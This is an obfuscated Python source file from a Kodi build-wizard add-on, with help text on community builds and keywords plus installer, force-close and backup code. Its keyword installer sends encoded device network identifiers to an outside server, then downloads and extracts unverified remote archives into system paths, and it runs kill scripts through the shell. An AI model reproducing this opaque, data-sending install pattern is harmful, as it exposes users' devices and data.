 '[CR][CR][COLOR=dodgerblue][B]Step 3:[/COLOR] Upload the zips[/B][CR]Upload the two zip files to a server that Kodi can access, it has to be a direct link and not somewhere that asks for captcha - archive.org and copy.com are two good examples. Do not use Dropbox unless you have a paid account, they have a fair useage policy and the chances are you\'ll find within 24 hours your download has been blocked and nobody can download it. [COLOR=lime]Top Tip: [/COLOR]The vast majority of problems occur when the wrong download URL has been entered in the online form, a good download URL normally ends in "=1" or "zip=true". Please double check when you copy the URL into a web browser it immediately starts downloading without the need to press any other button.'
 '[CR][CR][COLOR=dodgerblue][B]Step 4:[/COLOR] Submit the build[/B]'
 '[CR]Create a thread on the Community Builds section of the forum at [COLOR=orange]www.noobs[/COLOR][COLOR=dodgerblue]and[/COLOR][COLOR=orange]nerds.com[/COLOR].[CR]Full details can be found on there of the template you should use when posting, once you\'ve created your support thread (NOT BEFORE) you can request to become a member of the Community Builder group and you\'ll then be able to add your build via the web form. As soon as you\'ve successfully added the details your build will be live, if you can\'t find it in the CP addon make sure you have XXX enabled (if you marked it as having adult content) and also make sure you\'re running the same version of Kodi that you said it was compatible with. If you\'re running another version then you can select the option to "show all community builds" in the addon settings and that will show even the builds that aren\'t marked as compatible with your version of Kodi.'
 '[CR][CR][COLOR=gold]PRIVATE BUILDS[/COLOR][CR]If you aren\'t interested in sharing your build with the community you can still use our system for private builds. Just follow the instructions above but you will not need to create a support thread and you WILL require a minimum of 5 useful (not spam) posts on the forum. The 5 post rule only applies to users that wish to use the private builds option. Once you have 5 posts you\'ll be able to access the web form and in there you can enter up to 3 IP addresses that you want to be able to view your build(s). Anybody caught disobeying the forum rules will be banned so please make sure you understand the forum rules before posting, we welcome everyone but there is strictly no spamming or nonsense posts just saying something like "Thanks" in order to bump up your post count. The site rules even have examples of how you can get to 5 posts without receiving a ban.' )
 if 100 - 100: ooOo + OoO0O00
 if 95 - 95: i11iIiiIii . o0oOOo0O0Ooo + OoooooooOO % Oo0Ooo
def I1iI11ii ( ) :
 TXT . TXT ( 'Installing a build' , '[COLOR=dodgerblue][B]Step 1 (Optional):[/COLOR] Backup your system[/B][CR]When selecting an install option you\'ll be asked if you want to create a backup - we strongly recommend creating a backup of your system in case you don\'t like the build and want to revert back. Remember your backup may be quite large so if you\'re using a device with a very small amount of storage we recommend using a USB stick or SD card as the storage location otherwise you may run out of space and the install may fail.'
 '[CR][CR][COLOR=dodgerblue][B]Step 2:[/COLOR] Choose an install method:[/B][CR][CR]-------------------------------------------------------[CR][CR][COLOR=gold]1. Overwrite my current setup & install new build:[/COLOR] This copy over the whole build[CR]As the title suggests this will overwrite your existing setup with the one created by the community builder. We recommend using the wipe option in the maintenance section before running this, that will completely wipe your existing settings and will ensure you don\'t have any conflicting data left on the device. Once you\'ve wiped please restart Kodi and install the build, you can of course use this install option 1 without wiping but you may encounter problems. If you choose to do this DO NOT bombard the community builder with questions on how to fix certain things, they will expect you to have installed over a clean setup and if you\'ve installed over another build the responsibility for bug tracking lies solely with you!'
 '[CR][CR]-------------------------------------------------------[CR][CR][COLOR=gold]2. Install:[/COLOR] Keep my library & profiles[CR]This will install a build over the top of your existing setup so you won\'t lose anything already installed in Kodi. Your library and any profiles you may have setup will also remain unchanged.'
 '[CR][CR]-------------------------------------------------------[CR][CR][COLOR=gold]3. Install:[/COLOR] Keep my library only[CR]This will do exactly the same as number 2 (above) but it will delete any profiles you may have and replace them with the ones the build author has created.'
 '[CR][CR]-------------------------------------------------------[CR][CR][COLOR=gold]4. Install:[/COLOR] Keep my profiles only[CR]Again, the same as number 2 but your library will be replaced with the one created by the build author. If you\'ve spent a long time setting up your library and have it just how you want it then use this with caution and make sure you do a backup!'
 '[CR][CR]-------------------------------------------------------[CR][CR][COLOR=dodgerblue][B]Step 3:[/COLOR] Replace or keep settings?[/B][CR]When completing the install process you\'ll be asked if you want to keep your existing Kodi settings or replace with the ones in the build. If you choose to keep your settings then only the important skin related settings are copied over from the build. All your other Kodi settings such as screen calibration, region, audio output, resolution etc. will remain intact. Choosing to replace your settings could possibly cause a few issues, unless the build author has specifically recommended you replace the settings with theirs we would always recommend keeping your own.'
 '[CR][CR][COLOR=dodgerblue][B]Step 4: [/COLOR][COLOR=red]VERY IMPORTANT[/COLOR][/B][CR]For the install to complete properly Kodi MUST force close, this means forcing it to close via your operating system rather than elegantly via the Kodi menu. By default this add-on will attempt to make your operating system force close Kodi but there are systems that will not allow this (devices that do not allow Kodi to have root permissions).'
 ' Once the final step of the install process has been completed you\'ll see a dialog explaining Kodi is attempting a force close, please be patient and give it a minute. If after a minute Kodi hasn\'t closed or restarted you will need to manually force close. The recommended solution for force closing is to go into your operating system menu and make it force close the Kodi app but if you dont\'t know how to do that you can just pull the power from the unit.'
 ' Pulling the power is fairly safe these days, on most set top boxes it\'s the only way to switch them off - they rarely have a power switch. Even though it\'s considered fairly safe nowadays you do this at your own risk and we would always recommend force closing via the operating system menu.' )
 if 21 - 21: OOOOOOoo0O
 if 1 - 1: Oo0Ooo . i11iIiiIii
def ii1Ii ( ) :
 TXT . TXT ( 'What is a noobsandnerds keyword?' , '[COLOR=gold]WHAT IS A KEYWORD?[/COLOR][CR]The noobsandnerds keywords are based on the ingenious TLBB keyword system that was introduced years ago. It\'s nothing new and unlike certain other people out there we\'re not going to claim it as our idea. If you\'re already familiar with TLBB Keywords or even some of the copies out there like Cloudwords you will already know how this works but for those of you that don\'t have one of those devices we\'ll just go through the details...'
 '[CR][CR]Anyone in the community can make their own keywords and share them with others, it\'s a simple word you type in and then the content you uploaded to the web is downloaded and installed. Previously keywords have mostly been used for addon packs, this is a great way to get whole packs of addons in one go without the need to install a whole new build. We are taking this to the next level and will be introducing artwork packs and also addon fixes. More details will be available in the Community Portal section of the forum on www.noobsandnerds.com'
 '[CR][CR][CR][COLOR=gold]HOW DO I FIND A KEYWORD?[/COLOR][CR]The full list of noobsandnerds keywords can be found on the forum, in the Community Portal section you\'ll see a section for the keywords at the top of the page. Just find the pack you would like to install then using this addon type the keyword in when prompted (after clicking "Install a noobsandnerds keyword"). Your content will now be installed, if installing addon packs please be patient while each addon updates to the latest version directly from the developers repo.'
 '[CR][CR][CR][COLOR=gold]CAN I USE OTHER KEYWORDS?[/COLOR] (Cloudwords, TLBB etc.)[CR]Yes you can, just go to the addon settings and enter the url shortener that particular company use. Again you will find full details of supported keywords on the forum.' )
 if 17 - 17: O0 - OO000 + oOO00
 if 49 - 49: Oo0Ooo % ooOo
def i1iII11I1I1I ( ) :
 TXT . TXT ( 'How to create a keyword?' , '[COLOR=gold]NaN MAKE IT EASY![/COLOR][CR]The keywords can now be made very simply by anyone. We\'ve not locked this down to just our addon and others can use this on similar systems for creating keywords if they want...'
 '[CR][CR][COLOR=dodgerblue][B]Step 1:[/COLOR] Use a vanilla Kodi setup[/B][CR]You will require a complete fresh install of Kodi with absolutely nothing else installed and running the default skin. Decide what kind of pack you want to create, lets say we want to create a kids pack... Add all the kid related addons you want and make sure you also have the relevant repository installed too. In the unlikely event you\'ve found an addon that doesn\'t belong in a repository that\'s fine the system will create a full backup of that addon too (just means it won\'t auto update with future updates to the addon).'
 '[CR][CR][COLOR=dodgerblue][B]Step 2:[/COLOR] Create the backup[/B][CR]Using this addon create your backup, currently only addon packs are supported but soon more packs will be added. When you create the keyword you\'ll be asked for a location to store the zip file that will be created and a name, this can be anywhwere you like and can be called whatever you want - you do not need to add the zip extension, that will automatically be added for you so in our example here we would call it "kids".'
 '[CR][CR][COLOR=dodgerblue][B]Step 3:[/COLOR] Upload the zips[/B][CR]Upload the two zip file to a server that Kodi can access, it has to be a direct link and not somewhere that asks for captcha - archive.org and copy.com are two good examples. Do not use Dropbox unless you have a paid account, they have a fair useage policy and the chances are you\'ll find within 24 hours your download has been blocked and nobody can download it.[CR][CR][COLOR=lime]Top Tip: [/COLOR]The vast majority of problems occur when the wrong download URL has been entered in the online form, a good download URL normally ends in "=1" or "zip=true". Please double check when you copy the URL into a web browser it immediately starts downloading without the need to press any other button.'
 '[CR][CR][COLOR=dodgerblue][B]Step 4:[/COLOR] Create the keyword[/B][CR]Copy the download URL to your clipboard and then go to www.urlshortbot.com. In here you need to enter the URL in the "Long URL" field and then in the "Custom Keyword" field you need to enter "noobs" (without the quotation marks) followed by your keyword. We recommend always using a random test keyword for testing because once you have a keyword you can\'t change it, also when uploading make sure it\'s a link you can edit and still keep the same URL - that way it\'s easy to keep up to date and you can still use the same keyword. In our example of kids we would set the custom keyword as "noobskids". The noobs bit is ignored and is only for helping the addon know what to look for, the user would just type in "kids" for the kids pack to be installed.' )
 if 55 - 55: iIii1I11I1II1 + OoOoOO00
 if 7 - 7: OO000 / i1Ii11i1i % o0oOOoo - i1Ii11i1i * I1IiiI
def II11111I ( ) :
 TXT . TXT ( 'Adding Third Party Wizards' , '[COLOR=gold]ONE WIZARD TO RULE THEM ALL![/COLOR][CR]Did you know the vast majority of wizards out there (every single one we\'ve tested) has just been a copy/paste of very old code created by the team here? We\'ve noticed a lot of the users installing builds via these third party wizards have run into many different problems so we thought we\'d take it upon ourselves to help out...'
 '[CR][CR][CR][COLOR=gold]WHAT BENEFITS DOES THIS HAVE?[/COLOR][CR]We\'ve added extra code that checks for common errors, unfortunately there are some people out there using inferior programs to create their backups and that is causing problems in their wizards. If such a problem exists when trying to use another wizard you can try adding the details to this addon and it automatically fixes any corrupt files it finds. Of course there are other benefits... installing code from an unknown source can give the author access to your system so make sure you always trust the author(s). Why take the risk of installing wizards created by anonymous usernames on social media sites when you can install from a trusted source like noobsandnerds and you\'ll also be safe in the knowledge that any new updates and improvements will be made here first - we do not copy/paste code, we are actively creating new exciting solutions!'
 '[CR][CR][CR][COLOR=gold]ADDING 3RD PARTY WIZARDS TO THIS ADDON[/COLOR][CR][CR][COLOR=dodgerblue][B]Step 1:[/COLOR] Enabling 3rd Party Wizards[/B][CR]In the addon settings under the Community Builds section you have the option to enable third party community builds, if you click on this you will be able to enter details of up to 5 different wizards.'
 '[CR][CR][COLOR=dodgerblue][B]Step 2:[/COLOR] Enter the URL[/B][CR]As virtually all wizards use exactly the same structure all you need to do is find out what URL they are looking up in the code, you can open the default.py file of the wizard in a text editor and search for "http" and you will more than likely find the URL straight away. Try entering it in a web address, it should show the details for all the builds in that wizard in a text based page. If the page is blank don\'t worry it may just be locked from web browsers and can only be opened in Kodi, try it out and see if it works.'
 '[CR][CR][COLOR=dodgerblue][B]Step 3:[/COLOR] Enter the name[/B][CR]Give the wizard a name, now when you go into the Community Builds section you\'ll have the official noobsandnerds builds as an option and also any new ones you\'ve added.' )
 if 59 - 59: I1ii11iIi11i / OoooooooOO / OooO00OOoO00 - i1IIi
 if 58 - 58: I1ii11iIi11i / OoO0O00 / ooOo + oOO00 % OOOOOOoo0O / II111iiii
def Oo00Oo00Oooo ( url = 'http://www.iplocation.net/' , inc = 1 ) :
 i1iIiIi1I = re . compile ( "<td width='80'>(.+?)</td><td>(.+?)</td><td>(.+?)</td><td>.+?</td><td>(.+?)</td>" ) . findall ( iIiIIIi . http_GET ( url ) . content )
 for iIIIiI1iII1i , Ii1I11Ii1iI , OOOOOo00OOoO , i111iii1I11I in i1iIiIi1I :
  if inc < 2 : OO0o = xbmcgui . Dialog ( ) ; OO0o . ok ( 'Check My IP' , "[B][COLOR darkcyan]Your IP Address is: [/COLOR][/B] %s" % iIIIiI1iII1i , '[B][COLOR darkcyan]Your IP is based in: [/COLOR][/B] %s' % OOOOOo00OOoO , '[B][COLOR darkcyan]Your Service Provider is:[/COLOR][/B] %s' % i111iii1I11I )
  inc = inc + 1
  if 11 - 11: OOOOOOoo0O
  if 17 - 17: oOO00 % oOO00
def i11IIiiI ( url ) :
 if not os . path . exists ( IiIIIi1iIi ) :
  os . makedirs ( IiIIIi1iIi )
 print "KEYWORD_SEARCH"
 OOooiIi1 = 0
 o0O00oo0O = 0
 if 15 - 15: OoooooooOO
 i11iiI1iiIii = ''
 O0Oo0O00o0oo0OO = 'Enter Keyword'
 I1I111i = I1II11IIi11i ( O0Oo0O00o0oo0OO )
 i11iiI1iiIii = url + I1I111i
 url = 'http://urlshortbot.com/venztech'
 i11iiI1iiIii = url + I1I111i
 iiIII1i = os . path . join ( IiIIIi1iIi , I1I111i + '.zip' )
 if 63 - 63: I1ii11iIi11i . I1IiiI + Oo - oOO00 + OOOOOOoo0O
 try :
  IiII1111I = o00OoOOoO ( 'wifi' )
 except :
  IiII1111I = 'Unknown'
 try :
  iiIIii111Ii = o00OoOOoO ( 'eth0' )
 except :
  iiIIii111Ii = 'Unknown'
 try :
  OO000oooOo000 = iIiiII ( )
 except :
  OO000oooOo000 = 'Unknown'
 try :
  o0oO0o0Oo0 = Ii1 ( )
 except :
  o0oO0o0Oo0 = 'Unknown'
 if not 'Unknown' in IiII1111I and not 'Unknown' in iiIIii111Ii :
  OOoOOO = IiII1111I + '&' + OO000oooOo000 + '&' + o0oO0o0Oo0 + '&' + iiIIii111Ii . replace ( ' ' , '%20' )
  Ooo . create ( 'Contacting Server' , 'Attempt: 1' , '' , 'Please wait...' )
  while OOooiIi1 < 3 and o0O00oo0O == 0 :
   OOooiIi1 += 1
   Ooo . update ( 0 , 'Attempt: ' + str ( OOooiIi1 ) , '' , 'Please wait...' )
   try :
    i11i1ii1I = o0OO0o0o00o ( 'http://tlbb.me/comm.php?z=k&x=' + iII11 ( 'e' , OOoOOO ) + 'k=' + iII11 ( 'e' , I1I111i ) )
   except :
    i11i1ii1I = 'fail'
   if 'Success' in i11i1ii1I :
    o0O00oo0O = 1
  if o0O00oo0O == 1 :
   Ooo . close ( )
   OO0o . ok ( 'Venztech Code Success' , 'Congratulations, your Venztech Code has successfully been installed.' )
   xbmc . executebuiltin ( 'RunScript(special://home/addons/plugin.program.tbs/checknews.py' )
  if o0O00oo0O == 0 :
   try :
    print "Attempting download " + i11iiI1iiIii + " to " + iiIII1i
    Ooo . create ( "Web Installer" , "Downloading " , '' , 'Please Wait' )
    downloader . download ( i11iiI1iiIii , iiIII1i )
    print "### Keyword " + I1I111i + " Successfully downloaded"
    Ooo . update ( 0 , "" , "Extracting Zip Please Wait" )
    if 78 - 78: OO000
    if zipfile . is_zipfile ( iiIII1i ) :
     if 29 - 29: II111iiii
     try :
      if 'venztech' in url :
       extract . all ( iiIII1i , '/storage' , Ooo )
      else :
       extract . all ( iiIII1i , O0o0Oo , Ooo )
      xbmc . executebuiltin ( 'UpdateLocalAddons' )
      xbmc . executebuiltin ( 'UpdateAddonRepos' )
      OO0o . ok ( "Web Installer" , "" , "Content now installed" , "" )
      Ooo . close ( )
      if 79 - 79: iIii1I11I1II1 - i11iIiiIii + o0oOOoo - II111iiii . iIii1I11I1II1
     except :
      print "### Unable to install keyword (passed zip check): " + I1I111i
      if 84 - 84: Oo0Ooo % OooO00OOoO00 * O0 * OooO00OOoO00
    else :
     try :
      if os . path . getsize ( iiIII1i ) > 100000 and 'venztech' in url :
       Ooo . create ( "Restoring Backup" , "Copying Files..." , '' , 'Please Wait' )
       os . rename ( iiIII1i , III1iII1I1ii + '20150815123607.tar' )
       Ooo . update ( 0 , "" , "Kodi will now reboot" )
       xbmc . executebuiltin ( 'reboot' )
      else : OO0o . ok ( "Keyword error" , 'The keyword you typed could not be installed.' , 'Please check the spelling and if you continue to receive' , 'this message it probably means that keyword is no longer available.' )
     except :
      OO0o . ok ( "Error with zip" , 'The file you attempted to download is not in a valid zip format, please double check you typed in the correct word.' )
      print "### UNABLE TO INSTALL BACKUP - IT IS NOT A ZIP"
      if 66 - 66: Oo / iIii1I11I1II1 - OoOoOO00 % O0 . o0oOOoo
   except :
    OO0o . ok ( 'Code Not Recognised' , 'Sorry the code you entered has not been recognised, please check the spelling and try again.' )
 else :
  OO0o . ok ( 'Problem Detected' , 'Please try unplugging all wires to the device and reboot the router. Leave for 1 minute then retry.' )
  if 12 - 12: Oo0Ooo + I1IiiI
 if os . path . exists ( iiIII1i ) :
  os . remove ( iiIII1i )
  if 37 - 37: i1IIi * i11iIiiIii
  if 95 - 95: i11iIiiIii % i1Ii11i1i * Oo0Ooo + i1IIi . O0 + I1ii11iIi11i
def OOo00O0O ( ) :
 if 7 - 7: OoO0O00 * i11iIiiIii * iIii1I11I1II1 / Oo / i1Ii11i1i
 if not os . path . exists ( oo0OOo ) :
  os . makedirs ( oo0OOo )
 oOooOOOoOo = xbmc . getInfoLabel ( "System.BuildVersion" )
 iII1iii = float ( oOooOOOoOo [ : 4 ] )
 if xbmc . getCondVisibility ( 'system.platform.windows' ) :
  if iII1iii < 14 :
   try :
    oo00IIIIIIIiI = open ( os . path . join ( oo0OOo , 'win_xbmc.bat' ) , 'w+' )
    oo00IIIIIIIiI . write ( '@ECHO off\nTASKKILL /im XBMC.exe /f\ntskill XBMC.exe\nXBMC.exe' )
    oo00IIIIIIIiI . close ( )
    os . system ( os . path . join ( oo0OOo , 'win_xbmc.bat' ) )
   except :
    print "### Failed to run win_xbmc.bat"
  else :
   try :
    oo00IIIIIIIiI = open ( os . path . join ( oo0OOo , 'win_kodi.bat' ) , 'w+' )
    oo00IIIIIIIiI . write ( '@ECHO off\nTASKKILL /im Kodi.exe /f\ntskill Kodi.exe\nKodi.exe' )
    oo00IIIIIIIiI . close ( )
    os . system ( os . path . join ( oo0OOo , 'win_kodi.bat' ) )
   except :
    print "### Failed to run win_kodi.bat"
 elif xbmc . getCondVisibility ( 'system.platform.osx' ) :
  if iII1iii < 14 :
   try :
    oo00IIIIIIIiI = open ( os . path . join ( oo0OOo , 'osx_xbmc.sh' ) , 'w+' )
    oo00IIIIIIIiI . write ( 'killall -9 XBMC\nXBMC' )
    oo00IIIIIIIiI . close ( )
   except :
    pass
   try :
    os . system ( 'chmod 755 ' + os . path . join ( oo0OOo , 'osx_xbmc.sh' ) )
   except :
    pass
   try :
    os . system ( os . path . join ( oo0OOo , 'osx_xbmc.sh' ) )
   except :
    print "### Failed to run osx_xbmc.sh"
  else :
   try :
    oo00IIIIIIIiI = open ( os . path . join ( oo0OOo , 'osx_kodi.sh' ) , 'w+' )
    oo00IIIIIIIiI . write ( 'killall -9 Kodi\nKodi' )
    oo00IIIIIIIiI . close ( )
   except :
    pass
   try :
    os . system ( 'chmod 755 ' + os . path . join ( oo0OOo , 'osx_kodi.sh' ) )
   except :
    pass
   try :
    os . system ( os . path . join ( oo0OOo , 'osx_kodi.sh' ) )
   except :
    print "### Failed to run osx_kodi.sh"
    if 35 - 35: OOOOOOoo0O * Oo
 elif xbmc . getCondVisibility ( 'system.platform.android' ) :
  if os . path . exists ( '/data/data/com.rechild.advancedtaskkiller' ) :
   OO0o . ok ( 'Attempting to force close' , 'On the following screen please press the big button at the top which says "KILL selected apps". Kodi will restart, please be patient while your system updates the necessary files and your skin will automatically switch once fully updated.' )
   try :
    xbmc . executebuiltin ( 'StartAndroidActivity(com.rechild.advancedtaskkiller)' )
   except :
    print "### Failed to run Advanced Task Killer. Make sure you have it installed, you can download from https://archive.org/download/com.rechild.advancedtaskkiller/com.rechild.advancedtaskkiller.apk"
  else :
   OO0o . ok ( 'Advanced Task Killer Not Found' , "The Advanced Task Killer app cannot be found on this system. Please make sure you actually installed it after downloading. We can't do everything for you - on Android you do have to physically click on the download to install an app." )
  try :
   os . system ( 'adb shell am force-stop org.xbmc.kodi' )
  except :
   pass
  try :
   os . system ( 'adb shell am force-stop org.kodi' )
  except :
   pass
  try :
   os . system ( 'adb shell am force-stop org.xbmc.xbmc' )
  except :
   pass
  try :
   os . system ( 'adb shell am force-stop org.xbmc' )
  except :
   pass
  try :
   os . system ( 'adb shell kill org.xbmc.kodi' )
  except :
   pass
  try :
   os . system ( 'adb shell kill org.kodi' )
  except :
   pass
  try :
   os . system ( 'adb shell kill org.xbmc.xbmc' )
  except :
   pass
  try :
   os . system ( 'adb shell kill org.xbmc' )
  except :
   pass
  try :
   os . system ( 'Process.killProcess(android.os.Process.org.xbmc,kodi());' )
  except :
   pass
  try :
   os . system ( 'Process.killProcess(android.os.Process.org.kodi());' )
  except :
   pass
  try :
   os . system ( 'Process.killProcess(android.os.Process.org.xbmc.xbmc());' )
  except :
   pass
  try :
   os . system ( 'Process.killProcess(android.os.Process.org.xbmc());' )
  except :
   pass
 elif xbmc . getCondVisibility ( 'system.platform.linux' ) :
  if iII1iii < 14 :
   try :
    oo00IIIIIIIiI = open ( os . path . join ( oo0OOo , 'linux_xbmc' ) , 'w+' )
    oo00IIIIIIIiI . write ( 'killall XBMC\nkillall -9 xbmc.bin\nXBMC' )
    oo00IIIIIIIiI . close ( )
   except :
    pass
   try :
    os . system ( 'chmod a+x ' + os . path . join ( oo0OOo , 'linux_xbmc' ) )
   except :
    pass
   try :
    os . system ( os . path . join ( oo0OOo , 'linux_xbmc' ) )
   except :
    print "### Failed to run: linux_xbmc"
  else :
   try :
    oo00IIIIIIIiI = open ( os . path . join ( oo0OOo , 'linux_kodi' ) , 'w+' )
    oo00IIIIIIIiI . write ( 'killall Kodi\nkillall -9 kodi.bin\nkodi' )
    oo00IIIIIIIiI . close ( )
   except :
    pass
   try :
    os . system ( 'chmod a+x ' + os . path . join ( oo0OOo , 'linux_kodi' ) )
   except :
    pass
   try :
    os . system ( os . path . join ( oo0OOo , 'linux_kodi' ) )
   except :
    print "### Failed to run: linux_kodi"
 else :
  try :
   os . system ( 'killall AppleTV' )
  except :
   pass
  try :
   os . system ( 'sudo initctl stop kodi' )
  except :
   pass
  try :
   os . system ( 'sudo initctl stop xbmc' )
  except :
   pass
   if 65 - 65: II111iiii % i1IIi
   if 13 - 13: OoO0O00 * i1Ii11i1i + Oo0Ooo - oOO00
def i11IIii ( ) :
 xbmc . executebuiltin ( 'ReplaceWindow(settings)' )
 if 48 - 48: OOOOOOoo0O
 if 26 - 26: I1ii11iIi11i . OO000 % o0oOOo0O0Ooo
def i1IiI1iiIII1 ( ) :
 IioOo0O ( )
 if 68 - 68: i11iIiiIii . o0oOOoo % OooO00OOoO00
 ii1OO0 = xbmc . translatePath ( os . path . join ( oO0Oo , 'Community_Builds' , 'My_Builds' , '' ) )
 OoOoO00OOoOOOo0 = xbmc . translatePath ( os . path . join ( oO0Oo , 'Community_Builds' , 'My_Builds' , 'my_full_backup.zip' ) )
 oOoO00O = xbmc . translatePath ( os . path . join ( oO0Oo , 'Community_Builds' , 'My_Builds' , 'my_full_backup_GUI_Settings.zip' ) )
 if 47 - 47: OoOoOO00 . i1IIi
 if not os . path . exists ( ii1OO0 ) :
  os . makedirs ( ii1OO0 )
  if 47 - 47: i11iIiiIii . oOO00
 OO000OOo = oOo0O000Ooo0 ( heading = "Enter a name for this backup" )
 if 37 - 37: I1IiiI / OoooooooOO % i11iIiiIii % I1ii11iIi11i
 if ( not OO000OOo ) :
  return False , 0
  if 19 - 19: Oo0Ooo - OoO0O00 + i11iIiiIii / iIii1I11I1II1
 O0Oo0O00o0oo0OO = urllib . quote_plus ( OO000OOo )
 OooO00 = xbmc . translatePath ( os . path . join ( ii1OO0 , O0Oo0O00o0oo0OO + '.zip' ) )
 o0O00OoOOo = [ I1IiI ]
 iIiIIi11iI = [ "xbmc.log" , "xbmc.old.log" , "kodi.log" , "kodi.old.log" , '.DS_Store' , '.setup_complete' , 'XBMCHelper.conf' , 'Thumbs.db' , '.gitignore' ]
 I1i11II11i1iI = "Creating full backup of existing build"
 o0ooooO0 = "Creating Community Build"
 iI1 = "Archiving..."
 I1I1i1i = ""
 OOo0O = "Please Wait"
 if 1 - 1: oOO00 % i1IIi
 IIiIiII ( O0o0Oo , OoOoO00OOoOOOo0 , I1i11II11i1iI , iI1 , I1I1i1i , OOo0O , o0O00OoOOo , iIiIIi11iI )
 OO0o . ok ( 'Full Backup Complete' , 'You can locate your backup at:[COLOR=dodgerblue]' , OoOoO00OOoOOOo0 + '[/COLOR]' )
 if 41 - 41: OoO0O00 * OoO0O00 / OOOOOOoo0O + I1ii11iIi11i . o0oOOo0O0Ooo
 if 84 - 84: i11iIiiIii + OoO0O00 * I1IiiI + I1ii11iIi11i / OO000
def oOoooOOO0 ( ) :
 oOooOOOoOo = xbmc . getInfoLabel ( "System.BuildVersion" )
 iII1iii = float ( oOooOOOoOo [ : 4 ] )
 if 7 - 7: oOO00 % II111iiii - i1IIi . O0 * OO000
 if iII1iii < 14 :
  I1i111II = os . path . join ( oooooOoo0ooo , 'xbmc.log' )
  TXT . TXT ( 'XBMC Log' , I1i111II )
  if 99 - 99: OoooooooOO - Oo - Oo0Ooo % I1ii11iIi11i
 else :
  I1i111II = os . path . join ( oooooOoo0ooo , 'kodi.log' )
  TXT . TXT ( 'Kodi Log' , I1i111II )
  if 30 - 30: O0 + II111iiii / i11iIiiIii
  if 48 - 48: OoooooooOO / I1IiiI
def I1II11Ii11iI1 ( ) :
 OO0o . ok ( "Restore local guisettings fix" , "You should [COLOR=lime]ONLY[/COLOR] use this option if the guisettings fix is failing to download via the addon. Installing via this method means you do not receive notifications of updates" )
 oO0Oooo ( )
 if 16 - 16: OOOOOOoo0O . O0 - i1Ii11i1i * i1Ii11i1i
 if 80 - 80: OO000 % I1ii11iIi11i
def OOoo000OO00 ( mode ) :
 if not mode . endswith ( "premium" ) and not mode . endswith ( "public" ) and not mode . endswith ( "private" ) :
  OO000OOo = oOo0O000Ooo0 ( heading = "Search for content" )
  if 51 - 51: o0oOOoo * oOO00 * iIii1I11I1II1 / OoOoOO00 % oOO00
  if ( not OO000OOo ) :
   return False , 0
   if 36 - 36: I1ii11iIi11i * o0oOOo0O0Ooo + i11iIiiIii + OoooooooOO
  O0Oo0O00o0oo0OO = urllib . quote_plus ( OO000OOo )
  if 82 - 82: OoOoOO00 . OoOoOO00
  if mode == 'tutorials' :
   Oo0OO0 ( 'name=' + O0Oo0O00o0oo0OO )
   if 10 - 10: Oo0Ooo * I1ii11iIi11i . ooOo . OoooooooOO . Oo * I1ii11iIi11i
  if mode == 'hardware' :
   III1I11II11I ( 'name=' + O0Oo0O00o0oo0OO )
   if 80 - 80: i1Ii11i1i + OooO00OOoO00 . i1Ii11i1i + Oo
  if mode == 'news' :
   OOO0ooO0Oo0 ( 'name=' + O0Oo0O00o0oo0OO )
   if 85 - 85: i11iIiiIii . OooO00OOoO00 + OO000 / OO000
 if mode . endswith ( "premium" ) or mode . endswith ( "public" ) or mode . endswith ( "private" ) :
  IiII111i1i11 ( 'folder' , 'Search By Name' , mode + '&name=' , 'search_builds' , 'Manual_Search.png' , '' , '' , '' )
  IiII111i1i11 ( 'folder' , 'Search By Uploader' , mode + '&author=' , 'search_builds' , 'Search_Genre.png' , '' , '' , '' )
  IiII111i1i11 ( 'folder' , 'Search By Audio Addons Installed' , mode + '&audio=' , 'search_builds' , 'Search_Addons.png' , '' , '' , '' )
  IiII111i1i11 ( 'folder' , 'Search By Picture Addons Installed' , mode + '&pics=' , 'search_builds' , 'Search_Addons.png' , '' , '' , '' )
  IiII111i1i11 ( 'folder' , 'Search By Program Addons Installed' , mode + '&progs=' , 'search_builds' , 'Search_Addons.png' , '' , '' , '' )
  IiII111i1i11 ( 'folder' , 'Search By Video Addons Installed' , mode + '&vids=' , 'search_builds' , 'Search_Addons.png' , '' , '' , '' )
  IiII111i1i11 ( 'folder' , 'Search By Skins Installed' , mode + '&skins=' , 'search_builds' , 'Search_Addons.png' , '' , '' , '' )
  if 43 - 43: oOO00 . OoooooooOO - II111iiii
  if 90 - 90: I1IiiI - iIii1I11I1II1 + I1ii11iIi11i * Oo * ooOo
def I11iIIiiIiIi ( url ) :
 iI1i111I1Ii = 'http://noobsandnerds.com/TI/LatestNews/LatestNews.php?id=%s' % ( url )
 i11i1ii1I = o0OO0o0o00o ( iI1i111I1Ii ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 I11IIIi = re . compile ( 'name="(.+?)"' ) . findall ( i11i1ii1I )
 ooO = re . compile ( 'author="(.+?)"' ) . findall ( i11i1ii1I )
 iii1I11I = re . compile ( 'date="(.+?)"' ) . findall ( i11i1ii1I )
 I11iiiiI1i = re . compile ( 'content="(.+?)###END###"' ) . findall ( i11i1ii1I )
 if 55 - 55: o0oOOo0O0Ooo
 oOo00O0oo00o0 = I11IIIi [ 0 ] if ( len ( I11IIIi ) > 0 ) else ''
 ii1i1II = ooO [ 0 ] if ( len ( ooO ) > 0 ) else ''
 IiiIiiiiI1III = iii1I11I [ 0 ] if ( len ( iii1I11I ) > 0 ) else ''
 IiiI = I11iiiiI1i [ 0 ] if ( len ( I11iiiiI1i ) > 0 ) else ''
 OOOOOoO = i1iiiIi1Iii ( IiiI )
 IiIi11Iii = str ( '[COLOR=orange]Source: [/COLOR]' + ii1i1II + '     [COLOR=orange]Date: [/COLOR]' + IiiIiiiiI1III + '[CR][CR][COLOR=lime]Details: [/COLOR][CR]' + OOOOOoO )
 if 100 - 100: I1ii11iIi11i + ooOo + II111iiii . OOOOOOoo0O / I1ii11iIi11i
 TXT . TXT ( oOo00O0oo00o0 , IiIi11Iii )
 if 76 - 76: OO000 + OOOOOOoo0O - oOO00 * iIii1I11I1II1 % i1IIi
 if 72 - 72: o0oOOoo + II111iiii . O0 - OOOOOOoo0O / OoooooooOO . i1Ii11i1i
def iiiiiiI ( url ) :
 if iI1Ii11111iIi == 'true' :
  IiII111i1i11 ( '' , '[COLOR=orange]Latest ' + O0oo0OO0 + ' news[/COLOR]' , O0oo0OO0 , 'notify_msg' , 'LatestNews.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , '[COLOR=darkcyan]Manual Search[/COLOR]' , 'news' , 'manual_search' , 'Manual_Search.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'Official Kodi.tv News' , str ( url ) + '&author=Official%20Kodi' , 'grab_news' , 'XBMC.png' , '' , '' , '' )
